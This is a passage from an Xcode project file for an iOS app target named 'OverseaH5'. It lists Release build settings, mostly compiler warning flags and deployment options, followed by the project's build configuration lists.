				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		B118C3132E824F5300E8D807 /* Build configuration list for PBXProject "OverseaH5" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B118C32E2E824F5500E8D807 /* Debug */,
				B118C32F2E824F5500E8D807 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		B118C32B2E824F5500E8D807 /* Build configuration list for PBXNativeTarget "OverseaH5" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B118C32C2E824F5500E8D807 /* Debug */,
				B118C32D2E824F5500E8D807 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = B118C3102E824F5300E8D807 /* Project object */;
}
